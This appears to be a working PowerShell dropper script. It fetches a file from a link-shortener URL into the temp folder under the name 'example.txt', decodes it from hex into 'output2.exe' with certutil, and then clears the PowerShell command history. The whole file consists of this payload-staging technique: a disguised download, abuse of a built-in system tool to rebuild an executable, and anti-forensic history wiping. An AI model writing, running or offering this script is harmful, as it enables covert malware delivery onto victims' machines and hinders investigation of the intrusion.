# Define the URL of the file to be downloaded
$url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL

# Define the path to save the file in the %temp% folder
$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "downloaded_file.zip" with your desired filename

# Use Invoke-WebRequest to download the file
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Output the location of the downloaded file
Write-Host "File downloaded to: $tempPath"

# Define paths for input and output
$hexFilePath = "$env:TEMP\example.txt"  # Path to your hex file in TEMP
$outputExePath = "$env:TEMP\output2.exe"  # Path for the output EXE file

# Use certutil to convert hex to binary
certutil -f -decodeHex $hexFilePath $outputExePath

Write-Host "Executable created at: $outputExePath"

# Clear the PowerShell command history
Clear-History